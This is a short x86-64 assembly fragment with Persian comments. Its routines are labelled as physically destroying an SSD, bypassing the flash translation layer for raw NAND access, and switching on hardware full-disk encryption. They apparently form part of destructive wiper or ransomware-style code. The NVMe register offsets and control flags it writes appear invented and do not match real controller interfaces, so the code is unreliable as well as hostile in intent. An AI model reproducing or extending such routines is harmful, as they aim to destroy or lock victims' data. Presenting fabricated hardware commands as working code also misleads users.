section .text

; تخریب فیزیکی SSD
destroy_ssd:
    mov rdi, NVME_CONTROLLER_BASE
    ; ارسال فرمان تخریب
    mov qword [rdi + NVME_CR_ADMIN_QUEUE], 0
    mov qword [rdi + NVME_CR_DEVICE_CTL], NVME_CTL_FORCE_ERASE
    
    ; تنظیم پارامترهای تخریب
    mov rsi, nvme_destruct_cmd
    mov rcx, 16
    rep movsb
    
    ; فعال‌سازی تخریب
    mov byte [rdi + NVME_CR_EXEC], 1
    ret

; دسترسی مستقیم به فلش NAND
raw_nand_access:
    ; دور زدن FTL
    mov rdi, NVME_CONTROLLER_BASE
    mov qword [rdi + NVME_CR_ADMIN_QUEUE], 0
    mov qword [rdi + NVME_CR_DEVICE_CTL], NVME_CTL_RAW_NAND
    
    ; ارسال فرمان دسترسی مستقیم
    mov rsi, raw_nand_cmd
    mov rcx, 24
    rep movsb
    mov byte [rdi + NVME_CR_EXEC], 1
    ret

; رمزنگاری کل دیسک در سطح سخت‌افزار
full_disk_encrypt:
    ; تنظیم کلید رمزنگاری
    mov rdi, encryption_key
    mov rsi, 32
    call set_encryption_key
    
    ; فعال‌سازی رمزنگاری سخت‌افزاری
    mov rdi, NVME_CONTROLLER_BASE
    mov dword [rdi + NVME_CR_ENC_CTL], NVME_ENC_ENABLE | NVME_ENC_AES256_XTS
    mov byte [rdi + NVME_CR_EXEC], 1
    ret
    